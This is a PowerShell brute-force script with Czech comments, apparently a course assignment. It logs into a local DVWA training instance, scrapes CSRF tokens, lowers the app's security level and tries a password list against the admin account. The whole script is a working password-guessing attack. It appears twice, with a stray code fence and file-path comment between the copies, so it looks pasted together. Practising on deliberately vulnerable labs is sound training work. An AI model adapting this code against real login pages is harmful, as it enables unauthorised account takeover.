# dvwa-bruteforce-refactored.ps1
# Brute-force skript proti DVWA (PowerShell 7+, s CSRF tokenem)
# Upraveno tak, aby vyhovovalo PSRule/PScriptAnalyzer doporučením (SecureString, nepoužívat automatické proměnné, atd.)

# ---------------------------------------------------------
# ZÁKLADNÍ NASTAVENÍ
# ---------------------------------------------------------
$BaseUrl       = "http://localhost/dvwa"
$LoginUrl      = "$BaseUrl/login.php"
$SecurityUrl   = "$BaseUrl/security.php"
$BruteUrl      = "$BaseUrl/vulnerabilities/brute/"

# Přihlášení do DVWA kvůli PHPSESSID (plain text zde pouze pro demo; převedeme na SecureString níže)
$DvwaUser      = "admin"
$DvwaPassword  = "password"

# Cíl útoku
$TargetUser    = "admin"

# Slovník hesel (plain text pro pohodlné editování; před voláním funkce se převede na SecureString[])
$PasswordList = @(
    "admin"
    "password"
    "123456"
)

# ---------------------------------------------------------
# Pomocné funkce
# ---------------------------------------------------------

function Get-DvwaCsrfToken {
    param(
        [Parameter(Mandatory)]
        [string]$Html
    )

    # najdeme value u inputu name="user_token"
    $regex = 'name\s*=\s*["'']user_token["'']\s+value\s*=\s*["'']([^"'']+)["'']'
    $m = [regex]::Match($Html, $regex)

    if (-not $m.Success) {
        throw "Nepodařilo se najít CSRF token (user_token)."
    }

    return $m.Groups[1].Value
}

function Invoke-DvwaLogin {
    param(
        [Parameter(Mandatory)]
        [string]$Url,

        [Parameter(Mandatory)]
        [string]$Username,

        [Parameter(Mandatory)]
        [System.Security.SecureString]$Password,

        [Parameter(Mandatory)]
        [ref]$Session,

        [Parameter(Mandatory)]
        [string]$Base
    )

    Write-Host "[1] Načítám login stránku..." -ForegroundColor Cyan
    $loginGet = Invoke-WebRequest -Uri $Url -SessionVariable tmpSession -ErrorAction Stop
    $Session.Value = $tmpSession

    $token = Get-DvwaCsrfToken -Html $loginGet.Content
    Write-Host "    CSRF token: $token" -ForegroundColor DarkGray

    # secure string -> plain text pro použití v těle POSTu (pozn.: nutné pro formulář POST)
    $plainPassword = [Runtime.InteropServices.Marshal]::PtrToStringAuto(
        [Runtime.InteropServices.Marshal]::SecureStringToBSTR($Password)
    )

    $body = @{
        username   = $Username
        password   = $plainPassword
        Login      = "Login"
        user_token = $token
    }

    Write-Host "[2] Přihlašuji se jako '$Username'..." -ForegroundColor Cyan
    $resp = Invoke-WebRequest -Uri $Url -Method Post -Body $body -WebSession $Session.Value -ErrorAction Stop

    if ($resp.Content -like "*Login :: Damn Vulnerable Web Application*") {
        throw "Přihlášení selhalo (stále jsme na login stránce)."
    }

    Write-Host "[+] Přihlášení úspěšné." -ForegroundColor Green

    $cookies   = $Session.Value.Cookies.GetCookies($Base)
    $phpsessid = $cookies | Where-Object { $_.Name -eq "PHPSESSID" }
    if ($phpsessid) {
        Write-Host "[+] PHPSESSID = $($phpsessid.Value)" -ForegroundColor Green
    } else {
        Write-Host "[!] PHPSESSID cookie se nepodařilo najít." -ForegroundColor Yellow
    }
}

function Set-DvwaSecurityLow {
    param(
        [Parameter(Mandatory)]
        [string]$Url,

        [Parameter(Mandatory)]
        [ref]$Session,

        [Parameter(Mandatory)]
        [string]$Base
    )

    Write-Host "[3] Nastavuji security level na LOW..." -ForegroundColor Cyan

    # načteme security.php kvůli tokenu
    $secGet   = Invoke-WebRequest -Uri $Url -WebSession $Session.Value -ErrorAction Stop
    $secToken = Get-DvwaCsrfToken -Html $secGet.Content

    Write-Host "    security token: $secToken" -ForegroundColor DarkGray

    $body = @{
        security      = "low"
        seclev_submit = "Submit"
        user_token    = $secToken
    }

    Invoke-WebRequest -Uri $Url -Method Post -Body $body -WebSession $Session.Value -ErrorAction Stop | Out-Null

    $cookies    = $Session.Value.Cookies.GetCookies($Base)
    $secCookie  = $cookies | Where-Object { $_.Name -eq "security" }

    if ($secCookie) {
        Write-Host "[+] security cookie: $($secCookie.Name) = $($secCookie.Value)" -ForegroundColor Green
    } else {
        Write-Host "[!] Cookie 'security' se nepodařilo najít." -ForegroundColor Yellow
    }
}

function Invoke-DvwaBruteforce {
    param(
        [Parameter(Mandatory)]
        [string]$Url,

        [Parameter(Mandatory)]
        [string]$User,

        [Parameter(Mandatory)]
        [System.Security.SecureString[]]$PasswordList,

        [Parameter(Mandatory)]
        [ref]$Session
    )

    Write-Host "[4] Spouštím brute-force na $Url pro uživatele '$User'..." -ForegroundColor Cyan

    $found = $false

    foreach ($secureCandidate in $PasswordList) {
        # securestring -> plain text pro použití v URL
        $candidate = [Runtime.InteropServices.Marshal]::PtrToStringAuto(
            [Runtime.InteropServices.Marshal]::SecureStringToBSTR($secureCandidate)
        )

        Write-Host "[-] Zkouším heslo: $candidate"

        $uUser = [uri]::EscapeDataString($User)
        $uPass = [uri]::EscapeDataString($candidate)

        $fullUrl = "{0}?username={1}&password={2}&Login=Login" -f $Url, $uUser, $uPass
        Write-Host "    URL: $fullUrl" -ForegroundColor DarkGray

        $resp = Invoke-WebRequest -Uri $fullUrl -Method Get -WebSession $Session.Value -ErrorAction Stop

        # DVWA hláška při úspěchu (přizpůsobit podle konkrétní instalace)
        if ($resp.Content -match "Welcome to the password protected area\s+$User") {
            Write-Host "[+] Nalezeno správné heslo: $candidate" -ForegroundColor Green
            $found = $true
            break
        } else {
            Write-Host "    -> Heslo není platné." -ForegroundColor DarkGray
        }
    }

    if (-not $found) {
        Write-Host "[!] Správné heslo nebylo v seznamu nalezeno." -ForegroundColor Red
    }
}

# ---------------------------------------------------------
# HLAVNÍ ČÁST SKRIPTU
# ---------------------------------------------------------

try {
    $session = $null

    # převedeme plain text heslo na SecureString pro volání funkce
    $DvwaPasswordSecure = ConvertTo-SecureString -String $DvwaPassword -AsPlainText -Force

    # převedeme seznam hesel na SecureString[] aby vyhovoval PSRule/PScriptAnalyzer
    $PasswordListSecure = $PasswordList | ForEach-Object {
        ConvertTo-SecureString -String $_ -AsPlainText -Force
    }

    Invoke-DvwaLogin      -Url $LoginUrl    -Username $DvwaUser -Password $DvwaPasswordSecure -Session ([ref]$session) -Base $BaseUrl
    Set-DvwaSecurityLow   -Url $SecurityUrl -Session ([ref]$session) -Base $BaseUrl
    Invoke-DvwaBruteforce -Url $BruteUrl    -User $TargetUser -PasswordList $PasswordListSecure -Session ([ref]$session)
}
catch {
    Write-Host "[X] Došlo k chybě: $($_.Exception.Message)" -ForegroundColor Red
}
```// filepath: c:\Users\dadul\Desktop\aplikovanebezpecnostnitechnologie-1\ukol10.ps1
# dvwa-bruteforce-refactored.ps1
# Brute-force skript proti DVWA (PowerShell 7+, s CSRF tokenem)
# Upraveno tak, aby vyhovovalo PSRule/PScriptAnalyzer doporučením (SecureString, nepoužívat automatické proměnné, atd.)

# ---------------------------------------------------------
# ZÁKLADNÍ NASTAVENÍ
# ---------------------------------------------------------
$BaseUrl       = "http://localhost/dvwa"
$LoginUrl      = "$BaseUrl/login.php"
$SecurityUrl   = "$BaseUrl/security.php"
$BruteUrl      = "$BaseUrl/vulnerabilities/brute/"

# Přihlášení do DVWA kvůli PHPSESSID (plain text zde pouze pro demo; převedeme na SecureString níže)
$DvwaUser      = "admin"
$DvwaPassword  = "password"

# Cíl útoku
$TargetUser    = "admin"

# Slovník hesel (plain text pro pohodlné editování; před voláním funkce se převede na SecureString[])
$PasswordList = @(
    "admin"
    "password"
    "123456"
)

# ---------------------------------------------------------
# Pomocné funkce
# ---------------------------------------------------------

function Get-DvwaCsrfToken {
    param(
        [Parameter(Mandatory)]
        [string]$Html
    )

    # najdeme value u inputu name="user_token"
    $regex = 'name\s*=\s*["'']user_token["'']\s+value\s*=\s*["'']([^"'']+)["'']'
    $m = [regex]::Match($Html, $regex)

    if (-not $m.Success) {
        throw "Nepodařilo se najít CSRF token (user_token)."
    }

    return $m.Groups[1].Value
}

function Invoke-DvwaLogin {
    param(
        [Parameter(Mandatory)]
        [string]$Url,

        [Parameter(Mandatory)]
        [string]$Username,

        [Parameter(Mandatory)]
        [System.Security.SecureString]$Password,

        [Parameter(Mandatory)]
        [ref]$Session,

        [Parameter(Mandatory)]
        [string]$Base
    )

    Write-Host "[1] Načítám login stránku..." -ForegroundColor Cyan
    $loginGet = Invoke-WebRequest -Uri $Url -SessionVariable tmpSession -ErrorAction Stop
    $Session.Value = $tmpSession

    $token = Get-DvwaCsrfToken -Html $loginGet.Content
    Write-Host "    CSRF token: $token" -ForegroundColor DarkGray

    # secure string -> plain text pro použití v těle POSTu (pozn.: nutné pro formulář POST)
    $plainPassword = [Runtime.InteropServices.Marshal]::PtrToStringAuto(
        [Runtime.InteropServices.Marshal]::SecureStringToBSTR($Password)
    )

    $body = @{
        username   = $Username
        password   = $plainPassword
        Login      = "Login"
        user_token = $token
    }

    Write-Host "[2] Přihlašuji se jako '$Username'..." -ForegroundColor Cyan
    $resp = Invoke-WebRequest -Uri $Url -Method Post -Body $body -WebSession $Session.Value -ErrorAction Stop

    if ($resp.Content -like "*Login :: Damn Vulnerable Web Application*") {
        throw "Přihlášení selhalo (stále jsme na login stránce)."
    }

    Write-Host "[+] Přihlášení úspěšné." -ForegroundColor Green

    $cookies   = $Session.Value.Cookies.GetCookies($Base)
    $phpsessid = $cookies | Where-Object { $_.Name -eq "PHPSESSID" }
    if ($phpsessid) {
        Write-Host "[+] PHPSESSID = $($phpsessid.Value)" -ForegroundColor Green
    } else {
        Write-Host "[!] PHPSESSID cookie se nepodařilo najít." -ForegroundColor Yellow
    }
}

function Set-DvwaSecurityLow {
    param(
        [Parameter(Mandatory)]
        [string]$Url,

        [Parameter(Mandatory)]
        [ref]$Session,

        [Parameter(Mandatory)]
        [string]$Base
    )

    Write-Host "[3] Nastavuji security level na LOW..." -ForegroundColor Cyan

    # načteme security.php kvůli tokenu
    $secGet   = Invoke-WebRequest -Uri $Url -WebSession $Session.Value -ErrorAction Stop
    $secToken = Get-DvwaCsrfToken -Html $secGet.Content

    Write-Host "    security token: $secToken" -ForegroundColor DarkGray

    $body = @{
        security      = "low"
        seclev_submit = "Submit"
        user_token    = $secToken
    }

    Invoke-WebRequest -Uri $Url -Method Post -Body $body -WebSession $Session.Value -ErrorAction Stop | Out-Null

    $cookies    = $Session.Value.Cookies.GetCookies($Base)
    $secCookie  = $cookies | Where-Object { $_.Name -eq "security" }

    if ($secCookie) {
        Write-Host "[+] security cookie: $($secCookie.Name) = $($secCookie.Value)" -ForegroundColor Green
    } else {
        Write-Host "[!] Cookie 'security' se nepodařilo najít." -ForegroundColor Yellow
    }
}

function Invoke-DvwaBruteforce {
    param(
        [Parameter(Mandatory)]
        [string]$Url,

        [Parameter(Mandatory)]
        [string]$User,

        [Parameter(Mandatory)]
        [System.Security.SecureString[]]$PasswordList,

        [Parameter(Mandatory)]
        [ref]$Session
    )

    Write-Host "[4] Spouštím brute-force na $Url pro uživatele '$User'..." -ForegroundColor Cyan

    $found = $false

    foreach ($secureCandidate in $PasswordList) {
        # securestring -> plain text pro použití v URL
        $candidate = [Runtime.InteropServices.Marshal]::PtrToStringAuto(
            [Runtime.InteropServices.Marshal]::SecureStringToBSTR($secureCandidate)
        )

        Write-Host "[-] Zkouším heslo: $candidate"

        $uUser = [uri]::EscapeDataString($User)
        $uPass = [uri]::EscapeDataString($candidate)

        $fullUrl = "{0}?username={1}&password={2}&Login=Login" -f $Url, $uUser, $uPass
        Write-Host "    URL: $fullUrl" -ForegroundColor DarkGray

        $resp = Invoke-WebRequest -Uri $fullUrl -Method Get -WebSession $Session.Value -ErrorAction Stop

        # DVWA hláška při úspěchu (přizpůsobit podle konkrétní instalace)
        if ($resp.Content -match "Welcome to the password protected area\s+$User") {
            Write-Host "[+] Nalezeno správné heslo: $candidate" -ForegroundColor Green
            $found = $true
            break
        } else {
            Write-Host "    -> Heslo není platné." -ForegroundColor DarkGray
        }
    }

    if (-not $found) {
        Write-Host "[!] Správné heslo nebylo v seznamu nalezeno." -ForegroundColor Red
    }
}

# ---------------------------------------------------------
# HLAVNÍ ČÁST SKRIPTU
# ---------------------------------------------------------

try {
    $session = $null

    # převedeme plain text heslo na SecureString pro volání funkce
    $DvwaPasswordSecure = ConvertTo-SecureString -String $DvwaPassword -AsPlainText -Force

    # převedeme seznam hesel na SecureString[] aby vyhovoval PSRule/PScriptAnalyzer
    $PasswordListSecure = $PasswordList | ForEach-Object {
        ConvertTo-SecureString -String $_ -AsPlainText -Force
    }

    Invoke-DvwaLogin      -Url $LoginUrl    -Username $DvwaUser -Password $DvwaPasswordSecure -Session ([ref]$session) -Base $BaseUrl
    Set-DvwaSecurityLow   -Url $SecurityUrl -Session ([ref]$session) -Base $BaseUrl
    Invoke-DvwaBruteforce -Url $BruteUrl    -User $TargetUser -PasswordList $PasswordListSecure -Session ([ref]$session)
}
catch {
    Write-Host "[X] Došlo k chybě: $($_.Exception.Message)" -ForegroundColor Red
}